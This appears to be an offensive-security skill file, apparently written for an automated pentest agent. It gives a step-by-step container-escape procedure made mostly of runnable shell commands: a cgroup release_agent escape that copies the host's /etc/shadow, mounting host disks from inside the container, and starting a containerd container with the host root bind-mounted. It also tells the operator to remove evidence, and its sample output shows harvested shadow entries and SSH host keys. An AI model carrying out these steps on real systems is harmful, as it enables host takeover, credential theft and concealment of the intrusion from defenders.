---
name: container-escape-deep
description: Advanced container escape techniques covering capabilities, cgroups, mounts, and privileged abuse
version: 1.0.0
phase: post
category: post-exploitation
tags: [container, escape, privilege, linux]
tools: [nsenter, ctr, docker]
difficulty: advanced
opsec_level: high
time_estimate: 120s
severity_if_found: critical
related_skills:
  - container-escape
  - container-docker-socket
  - privesc-linux
mitre_attack:
  - T1611
---

## When to Use

Use this skill when you have shell access inside a container and basic escape
checks failed. This covers advanced techniques: cgroup escape, device
passthrough, ctr (containerd) abuse, and capabilities exploitation.

## Prerequisites

- Shell access inside a container
- nsenter (util-linux)
- ctr (containerd CLI, if containerd runtime)
- docker CLI (if socket accessible)

## Procedure

```bash
# 1. Enumerate all capabilities
cat /proc/1/status | grep -i "capeff\|capinh\|capprm"
capsh --print 2>/dev/null
# Check for CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_SYS_PTRACE, CAP_DAC_OVERRIDE

# 2. Check mount points and filesystem types
mount
cat /proc/mounts | grep -v "^proc\|^tmpfs\|^devpts\|^sysfs"
cat /proc/self/mountinfo | grep -E "rw," | grep -v "cgroup\|proc\|tmpfs"

# 3. Cgroup notify_on_release escape
mkdir -p /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
HOST_PATH=$(cat /proc/mounts | grep "upperdir" | head -1 | awk '{print $2}' | sed 's/upperdir//')
echo "$HOST_PATH/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /tmp/cmd && echo "cat /etc/shadow > $HOST_PATH/output" >> /tmp/cmd
chmod +x /tmp/cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"; sleep 2; cat /output 2>/dev/null

# 4. Device passthrough (if /dev/ devices are available)
ls -la /dev/ | grep -E "sd[a-z]|vd[a-z]|nvme|dm-"
# Mount host partition directly
mkdir -p /tmp/hostroot
mount /dev/sda1 /tmp/hostroot 2>/dev/null || mount /dev/vda1 /tmp/hostroot 2>/dev/null
cat /tmp/hostroot/etc/shadow 2>/dev/null

# 5. containerd / ctr escape (if socket accessible)
ctr --address /run/containerd/containerd.sock images list
ctr --address /run/containerd/containerd.sock run --rm \
  -t --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/ubuntu:latest /bin/sh

# 6. /proc/sysrq-trigger abuse (CAP_SYS_ADMIN)
echo h > /proc/sysrq-trigger 2>/dev/null && echo "sysrq available"

# 7. Check for insecure seccomp / apparmor profiles
cat /proc/self/attr/current
cat /proc/1/attr/current
```

## OPSEC Rules

- **CRITICAL**: Container escape grants host access — extreme caution required
- Do NOT modify host system files beyond proof-of-concept
- Clean up all artifacts created during escape (cgroup dirs, temp files)
- Do NOT persist access mechanisms (backdoors, cron, binaries)
- Verify escape but remove evidence unless authorized for persistence
- Kill any spawned containers after verification

## Verification

- Confirm host root filesystem is accessible
- Verify /etc/shadow or equivalent host-level file is readable
- Test that escape is repeatable with the same technique

## Pitfalls

- cgroup v2 does not support notify_on_release escape
- Containerd socket may be permission-restricted
- CAP_SYS_ADMIN is filtered by some security profiles
- Flatcar / CoreOS use different device mapper names
- Podman uses a different runtime (no containerd socket)

## Output Format

```
[CAPS]    CapEff: 0000003fffffffff — privileged container
[ESCAPE]  Technique: cgroup notify_on_release
[HOST]    /etc/shadow readable — 12 user entries
[HOST]    SSH host keys accessible: /etc/ssh/ssh_host_rsa_key
[CTR]     containerd socket available — image pull and run possible
[DEVICE]  /dev/vda1 mountable — full host disk access
[CRITICAL] Container escape via cgroup notify_on_release — host compromised
```
